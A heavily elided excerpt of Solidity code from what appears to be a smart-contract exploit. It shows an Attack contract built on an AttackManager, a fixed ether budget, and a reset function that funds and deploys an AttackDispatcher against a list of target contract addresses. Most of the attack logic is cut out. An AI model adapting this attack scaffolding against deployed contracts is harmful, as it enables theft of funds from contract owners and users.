 ...
 * parameter. Make sure to send at least 1 ether and 710896316905437286 wei to the attack
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x17be5322b0ac3866; /* equals 1 ether and 710896316905437286 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 1710896316905437285 }(4, _targets);
    }
